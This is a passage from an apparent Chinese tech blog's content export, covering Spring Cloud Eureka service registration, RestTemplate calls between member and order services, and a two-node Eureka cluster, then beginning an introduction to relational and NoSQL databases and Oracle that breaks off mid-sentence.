class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">           <span class="attr">defaultZone:</span> <span class="string">http://localhost:8100/eureka</span></span><br><span class="line"></span><br><span class="line">           </span><br><span class="line">	<span class="comment">###因为该应用为注册中心，不会注册自己</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">	<span class="comment">###是否需要从eureka上获取注册信息</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="服务接口"><a href="#服务接口" class="headerlink" title="服务接口"></a>服务接口</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MemberController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@RequestMapping</span>(<span class="string">"/getMember"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getMember</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"this is getMember"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="启动会员服务"><a href="#启动会员服务" class="headerlink" title="启动会员服务"></a>启动会员服务</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppMember</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		SpringApplication.run(AppMember<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/springcloud/%E7%AC%AC2%E7%AB%A0/02.png" alt="SpringCloud"></p><h3 id="服务消费者"><a href="#服务消费者" class="headerlink" title="服务消费者"></a>服务消费者</h3><h4 id="Maven依赖信息-2"><a href="#Maven依赖信息-2" class="headerlink" title="Maven依赖信息"></a>Maven依赖信息</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 管理依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>Finchley.M7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- SpringBoot整合Web组件 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- SpringBoot整合eureka客户端 --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 注意： 这里必须要添加， 否者各种依赖有问题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">id</span>&gt;</span>spring-milestones<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>Spring Milestones<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url</span>&gt;</span>https://repo.spring.io/libs-milestone<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">enabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Application-yml配置"><a href="#Application-yml配置" class="headerlink" title="Application.yml配置"></a>Application.yml配置</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">###服务启动端口号</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8001</span></span><br><span class="line"><span class="comment">###服务名称(服务注册到eureka名称)  </span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">    <span class="attr">application:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">app-itmayiedu-order</span></span><br><span class="line"><span class="comment">###服务注册到eureka地址</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">           <span class="attr">defaultZone:</span> <span class="string">http://localhost:8100/eureka</span></span><br><span class="line"></span><br><span class="line">           </span><br><span class="line">	<span class="comment">###因为该应用为注册中心，不会注册自己</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">	<span class="comment">###是否需要从eureka上获取注册信息</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="使用rest方式调用服务"><a href="#使用rest方式调用服务" class="headerlink" title="使用rest方式调用服务"></a>使用rest方式调用服务</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderController</span> </span>&#123;</span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> RestTemplate restTemplate;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@RequestMapping</span>(<span class="string">"/getorder"</span>)</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">getOrder</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// order 使用rpc 远程调用技术 调用 会员服务</span></span><br><span class="line">		String memberUrl = <span class="string">"http://app-itmayiedu-member/getMember"</span>;</span><br><span class="line">		String result = restTemplate.getForObject(memberUrl, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">		System.out.println(<span class="string">"订单服务调用会员服务,result:"</span> + result);</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="启动消费者服务"><a href="#启动消费者服务" class="headerlink" title="启动消费者服务"></a>启动消费者服务</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppOrder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		SpringApplication.run(AppOrder<span class="class">.<span class="keyword">class</span>, <span class="title">args</span>)</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Bean</span></span><br><span class="line">	<span class="meta">@LoadBalanced</span></span><br><span class="line">	<span class="function">RestTemplate <span class="title">restTemplate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span> RestTemplate();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>@LoadBalanced就能让这个RestTemplate在请求时拥有客户端负载均衡的能力<br><img src="/images/springcloud/%E7%AC%AC2%E7%AB%A0/03.png" alt="SpringCloud"><br><img src="/images/springcloud/%E7%AC%AC2%E7%AB%A0/04.png" alt="SpringCloud"></p><h2 id="高可用注册中心"><a href="#高可用注册中心" class="headerlink" title="高可用注册中心"></a>高可用注册中心</h2><p>在微服务中，注册中心非常核心，可以实现服务治理，如果一旦注册出现故障的时候，可能会导致整个微服务无法访问，在这时候就需要对注册中心实现高可用集群模式。</p><h3 id="Eureka高可用原理"><a href="#Eureka高可用原理" class="headerlink" title="Eureka高可用原理"></a>Eureka高可用原理</h3><p>默认情况下Eureka是让服务注册中心，不注册自己</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">### 因为该应用为注册中心，不会注册自己</span></span><br><span class="line"><span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment">### 不需要去注册中心上检索服务</span></span><br><span class="line"><span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>Eureka高可用实际上将自己作为服务向其他服务注册中心注册自己，这样就可以形成一组相互注册的服务注册中心，从而实现服务清单的互相同步，达到高可用效果。</p><h3 id="Eureka集群环境搭建"><a href="#Eureka集群环境搭建" class="headerlink" title="Eureka集群环境搭建"></a>Eureka集群环境搭建</h3><h4 id="Eureka01配置"><a href="#Eureka01配置" class="headerlink" title="Eureka01配置"></a>Eureka01配置</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">###服务端口号</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8100</span></span><br><span class="line"><span class="comment">###eureka 基本信息配置</span></span><br><span class="line"><span class="attr">spring:</span> </span><br><span class="line"> <span class="attr">application:</span> </span><br><span class="line">  <span class="attr">name:</span> <span class="string">eureka-server</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="comment">###注册到eurekaip地址</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">serviceUrl:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://127.0.0.1:8200/eureka/</span></span><br><span class="line">	<span class="comment">###因为自己是为注册中心，不需要自己注册自己</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">	<span class="comment">###因为自己是为注册中心，不需要检索服务</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="Eureka02配置"><a href="#Eureka02配置" class="headerlink" title="Eureka02配置"></a>Eureka02配置</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">###服务端口号</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8200</span></span><br><span class="line"><span class="comment">###eureka 基本信息配置</span></span><br><span class="line"><span class="attr">spring:</span> </span><br><span class="line"> <span class="attr">application:</span> </span><br><span class="line">  <span class="attr">name:</span> <span class="string">eureka-server</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">instance:</span></span><br><span class="line">    <span class="comment">###注册到eurekaip地址</span></span><br><span class="line">    <span class="attr">hostname:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">serviceUrl:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://127.0.0.1:8100/eureka/</span></span><br><span class="line">	<span class="comment">### 因为自己是为注册中心，不需要自己注册自己</span></span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">	<span class="comment">### 因为自己是为注册中心，不需要检索服务</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="客户端集成Eureka集群"><a href="#客户端集成Eureka集群" class="headerlink" title="客户端集成Eureka集群"></a>客户端集成Eureka集群</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8000</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">app-itmayiedu-member</span></span><br><span class="line"><span class="comment">#eureka:</span></span><br><span class="line"><span class="comment">#  client:</span></span><br><span class="line"><span class="comment">#    service-url:</span></span><br><span class="line"><span class="comment">#      defaultZone: http://localhost:8100/eureka</span></span><br><span class="line"><span class="comment">###集群地址</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">           <span class="attr">defaultZone:</span> <span class="string">http://localhost:8100/eureka,http://localhost:8200/eureka</span>    </span><br><span class="line">    <span class="attr">register-with-eureka:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">fetch-registry:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="Maven配置"><a href="#Maven配置" class="headerlink" title="Maven配置"></a>Maven配置</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 管理依赖 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-dependencies<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">version</span>&gt;</span>Finchley.M7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">type</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">scope</span>&gt;</span>import<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencyManagement</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!--SpringCloud eureka-server --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 注意： 这里必须要添加， 否者各种依赖有问题 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">id</span>&gt;</span>spring-milestones<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>Spring Milestones<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">url</span>&gt;</span>https://repo.spring.io/libs-milestone<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">enabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="课程截图"><a href="#课程截图" class="headerlink" title="课程截图"></a>课程截图</h2><h3 id="rpc核心"><a href="#rpc核心" class="headerlink" title="rpc核心"></a>rpc核心</h3><p><img src="/images/springcloud/%E7%AC%AC2%E7%AB%A0/rpc%E6%A0%B8%E5%BF%83.png" alt="SpringCloud"></p><h3 id="服务注册与发现原理"><a href="#服务注册与发现原理" class="headerlink" title="服务注册与发现原理"></a>服务注册与发现原理</h3><p><img src="/images/springcloud/%E7%AC%AC2%E7%AB%A0/%E6%9C%8D%E5%8A%A1%E6%B3%A8%E5%86%8C%E4%B8%8E%E5%8F%91%E7%8E%B0%E5%8E%9F%E7%90%86.png" alt="SpringCloud"></p><h3 id="注册中心原理"><a href="#注册中心原理" class="headerlink" title="注册中心原理"></a>注册中心原理</h3><p><img src="/images/springcloud/%E7%AC%AC2%E7%AB%A0/%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E5%8E%9F%E7%90%86.png" alt="SpringCloud"></p><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p><img src="/images/springcloud/%E7%AC%AC2%E7%AB%A0/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1.png" alt="SpringCloud"></p>]]></content>
      <categories>
        <category>Spring Cloud</category>
      </categories>
      <tags>
        <tag>Spring Cloud</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库介绍与分类</title>
    <url>/MySQL/e95cfa56.html</url>
    <content><![CDATA[<h2 id="1-1-数据库介绍"><a href="#1-1-数据库介绍" class="headerlink" title="1.1 数据库介绍"></a>1.1 数据库介绍</h2><h3 id="1-1-1-什么是数据库？"><a href="#1-1-1-什么是数据库？" class="headerlink" title="1.1.1 什么是数据库？"></a>1.1.1 什么是数据库？</h3><p>简单的说，数据库(英文DataBase)就是一个存放数据的仓库，这个仓库是按照一定的数据结构(数据结构是指数据的组织形式或数据之间的联系)来组织、存储的，我们可以通过数据库提供的多种方法来管理数据库里的数据。</p><p>更简单的形象理解，数据库和我们生活中存放杂物的储物间仓库性质一样，区别只是存放的东西不同。杂物间存放实体的物件，而数据库里存储的是数据，这样我们就对数据库有一个初步的了解。</p><a id="more"></a><p>数据库诞生于距现在大概六十多年前，随着信息技术的发展和人类社会的不断进步，特别是2000年以后，数据不仅仅是存储和管理数据了，而转变成用户所需要的各种数据管理方式。数据库有很多种类和功能，从最简单的存储有各种数据的表格到能够进行海量数据存储的大型数据库都在各个方面得到了广泛的应用。</p><h2 id="1-2-数据库的种类"><a href="#1-2-数据库的种类" class="headerlink" title="1.2 数据库的种类"></a>1.2 数据库的种类</h2><p>按照早期的数据库理论，比较流行的数据库模型有三种，分别为层次式数据库、网路式数据库和关系型数据库。而在当今的互联网中，最常用的数据库模型主要是两种，即关系型数据库和非关系型数据，我们不是写教科书，更不是研究数据库理论，因此，我们主要讲解关系数据库和非关系数据库这两类最重要的也是目前实际使用中最多的数据种类。</p><h3 id="1-2-1-关系型数据库介绍"><a href="#1-2-1-关系型数据库介绍" class="headerlink" title="1.2.1 关系型数据库介绍"></a>1.2.1 关系型数据库介绍</h3><p>(1)关系型数据库由来<br>虽然网状数据库和层次数据库已经很好地解决了数据的集中和共享问题，但是在数据独立性和抽象级别上仍有很大欠缺。用户在对这两种数据库进行存取是，仍然需要明确数据的存储结构，支出存取路劲。而关系数据库就可以较好地解决这些问题。</p><p>(2)关系数据库介绍<br>关系数据库模型是吧复杂的数据结构归结为简单的二元关系(即二维表格形式)。例如老男孩教育某一期的学生关系就是一个二元关系。在关系数据库中，对数据的操作几乎全部建立在一个或多个关系表格上，通过对这些关联的表格分类、合并、连接或选取等运算来实现数据的管理。</p><p>关系数据库诞生距今已有40多年了，从理论产生发展到现实产品，例如：大家最常见的MySQL和Oracle数据库，Oracle在数据库领域里上升到了霸主地位，形成每年高达数百亿美元的庞大产业市场，而MySQL也是不容忽视的数据库，以至于被Oracle重金收购了。</p><p>(3)关系型数据库表格之间的关系举例<br><img src="/images/database/mysql/db01.png" alt="关系型表格"><br><img src="/images/database/mysql/db02.png" alt="关系型表格"></p><h2 id="1-2-2-非关系型数据库介绍"><a href="#1-2-2-非关系型数据库介绍" class="headerlink" title="1.2.2 非关系型数据库介绍"></a>1.2.2 非关系型数据库介绍</h2><h3 id="1-2-2-1-非关系型数据库诞生背景"><a href="#1-2-2-1-非关系型数据库诞生背景" class="headerlink" title="1.2.2.1 非关系型数据库诞生背景"></a>1.2.2.1 非关系型数据库诞生背景</h3><p>非关系型数据库也被称为NOSQL数据库，请读者注意，NOSQL的本意是“Not Only SQL”，指的是非关系型数据库，而不是“NO SQL”的意思(没有SQL语句?)，因此，NoSQL的产生并不是要彻底地否定关系型数据库，而是作为传统关系型数据库的一个有效补充。NoSQL数据库在特定的场景下可以发挥出难以想象的高效率和高性能。</p><p>随着互联网web2.0网站的兴起，传统的关系数据库在应付web2.0网站，特别是对于规模日益扩大的海量数据，超大的规模和高并发的微博、微信、SNS类型的web2.0纯动态网站已经显得力不从心，暴露了很多难以克服的问题，例如:传统的关系数据库IO瓶颈、性能瓶颈都难以有效突破，于是开始出现了大批针对特定场景，以高性能和使用便利为目的功能特异化的数据库产品，NoSQL(非关系型)类的数据库就是在这样的情景中诞生并得到了非常迅速的发展。</p><p>NOSQL是非关系型数据库的广义定义。它打破了长久以来关系型数据与ACID理论大一统的局面。NoSQL(非关系型)类的数据库就是在这样的情景中诞生并得到了非常迅速的发展。</p><p>NoSQL是非关系型数据库广义定义。它打破了长久以来关系数据库与ACID理论大一统的局面。NoSQL数据存储不需要固定的表结构，通常也不存在连接操作。在大数据<br>存取中具备关系数据库无法比拟的性能优势。该术语（NoSQL）在2009年初得到了广泛认同。</p><p>当今的应用日系结构需要数据库存储在横向伸缩性上能够满足需求。而NoSQL存储就是为了实现这个需求而诞生的。Google的BigTable与Amazon的Dynamo是非常成功的商业NoSQL实现。一些开源的NoSQL体系，如Facebook的Cassandre，Apache的HBase，也得到了广泛认同，Rediso，mongodb也逐渐的越来越受到各类大中小型公司的欢迎和追捧。</p><h2 id="1-2-2-1-非关系型数据库的种类"><a href="#1-2-2-1-非关系型数据库的种类" class="headerlink" title="1.2.2.1 非关系型数据库的种类"></a>1.2.2.1 非关系型数据库的种类</h2><p>(1)键值(Key-Value)存储数据库<br>键值数据库就类似传统语言中使用的哈希表。可以通过key来添加、查询或者删除数据，因为使用key主键访问，所有会获得很高的性能及扩展性</p><p>键值(Key-Value)数据库主要是使用一个哈希表，这个表中有一个特定的键和一个指针指向特定的数据。Key/Value模型对于IT系统来说的优势在于简单、易部署、高并发。</p><p>典型产品：Memcached、Redis、MemcacheDB、Berkeley DB</p><p>(2)列存储(Column-oriented)数据库<br>列存储数据库将数据存储在列族(column family)中，一个列族存储经常被一起查询的相关数据。举个例子，如果我们有一个Person类，我们通常会一起查询他们的姓名和年龄而不是薪资。这种情况下，姓名和年龄就会被放入一个列族中，而薪资则在另一个列族中。</p><p>这部分数据库通常是用来应对分布式存储的海量数据。键仍然存在，但是他们的特点是指向了多个列。这些列是由列家族来安排的。</p><p>典型产品: Cassandra, HBase</p><p>(3)面向文档(Documnent-Oriented) 数据库<br>文档数据库的灵感是来自于Lotus Notes办公软件的，而且它同第一种键值存储相类似。该类型的数据模型是版本化的文档，半结构化的文档以特定的格式存储，比如JSON。文档型数据库可以看做是键值数据库的升级版，允许之间嵌套键值。而且文档型数据库比键值数据库的查询效率更高。</p><p>面向文档数据库会将数据以文档的形式存储。每个文档都是自包含的数据单元，是一系列数据项的集合。每个数据项都有一个名称与对应的值，值既可以是简单的数据类型，如字符串、数字和日期等；也可以是复杂的类型，如有序列表和关联对象。数据存储的最小单位是文档，同一个表中存储的文档属性可以是不同的，数据可以使用XML、JSON或者JSONB等多种形式存储。</p><p>典型产品: MongoDB、 CouchDB</p><p>(4)图形（Graph）数据库<br>图形数据库允许我们将数据以图的方式存储。实体会被作为顶点，而实体之间的关系则会被作为边。比如我们有三个实体，SteveJobs、Apple和Next，则会有两个“Founded by”的边将Apple和Next连接到Steve Jobs。</p><p>图形结构的数据库同其他行列以及刚性结构的SQL数据库不同，它是使用灵活的图形模型，并且能够扩展到对个服务器上。NoSQL数据库没有标准的查询语言(SQL),因此进行数据库查询需要制定数据模型。许多NoSQL数据库都有REST式的数据接口或者查询API。</p><p>典型产品:Neo4J、 InfoGrid</p><h2 id="1-3-常用关系型数据库产品介绍"><a href="#1-3-常用关系型数据库产品介绍" class="headerlink" title="1.3 常用关系型数据库产品介绍"></a>1.3 常用关系型数据库产品介绍</h2><h3 id="1-3-1-Oracle数据库"><a href="#1-3-1-Oracle数据库" class="headerlink" title="1.3.1 Oracle数据库"></a>1.3.1 Oracle数据库</h3><p>Oracle前身叫SDL，由Larry Ellison和另两个编程人员在1977年创办，他们开发了自己的拳头产品，在市场上大量销售，1979年，Oracle公司引入了第一个商用SQL关系数据库管理系统。Oracle公司是最早开发关系数据库的厂商之一，其产品支持最广泛的操作系统平台。目前Oracle关系数据库产品的市场占有率数一数二。</p><p>Oracle公司是目前全球最大的数据库软件公司，也是近年业务增长极为迅速的软件提供商与服务商。</p><p>2007年7月12日，甲骨文公司在美国纽约宣布推出数据库Oracle 11g，这是Oracle数据库的最新版本。Oralce介绍说，Oracle 11g有400多项功能，经过了1500万个小时的测试，开发工作量达到了3.6万人/月。Oracle11g在安全，XML DB，备份等方面得到了很大提升。</p><p>主要应用范围: 传统大企业，大公司，政府， 金融， 证券等等。<br>版本升级: Oracle8i, Oracle9i, Oracle10g, Oracle11g, Oracle12c</p><h2 id="1-3-2-MySQL数据库"><a href="#1-3-2-MySQL数据库" class="headerlink" title="1.3.2 MySQL数据库"></a>1.3.2 MySQL数据库</h2><p>MySQL数据库是一个中小型关系型数据库管理系统，软件开发者为瑞典MySQL 